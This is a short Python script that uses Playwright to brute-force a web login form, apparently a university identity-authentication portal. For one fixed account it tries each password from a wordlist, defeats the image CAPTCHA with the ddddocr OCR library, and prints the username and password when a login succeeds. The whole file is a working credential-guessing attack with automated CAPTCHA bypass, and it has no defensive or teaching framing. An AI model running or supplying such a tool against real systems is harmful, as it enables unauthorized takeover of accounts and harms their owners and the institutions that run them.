from playwright.sync_api import sync_playwright
import time
import ddddocr
import datetime
if __name__ == '__main__':
    ocr = ddddocr.DdddOcr(show_ad=False)
    url = 'http://xxxxxxx.com'
    usr= "22064229"
    pwd_list = open("password.txt","r")
    response_url = 'http://xxxxxxxx'
    with sync_playwright() as p:
        with p.chromium.launch(headless=False) as browser:
            with browser.new_context(locale="zh-CN") as context:
                page = context.new_page()
                page.goto(url)
                time.sleep(10)
                for pwd in pwd_list:
                    time.sleep(5)
                    page.get_by_placeholder("用户名").fill(usr)
                    page.get_by_placeholder("密码").fill(pwd)
                    filename = 'code_img/' + datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S-%f') + '.png'
                    page.get_by_role("img", name="验证码").screenshot(path=filename)
                    with open(filename,'rb') as f :
                        image = f.read()
                    code = ocr.classification(image)
                    page.get_by_role("textbox", name="验证码").fill(code)
                    page.once("dialog",lambda dialog:dialog.dismiss())
                    page.get_by_role("button",name="登录").click()
                    page.wait_for_load_state()
                    if "统一身份认证" not in page.title():
                        print(f'爆破成功，账户名为{usr},密码为{pwd}')
                                
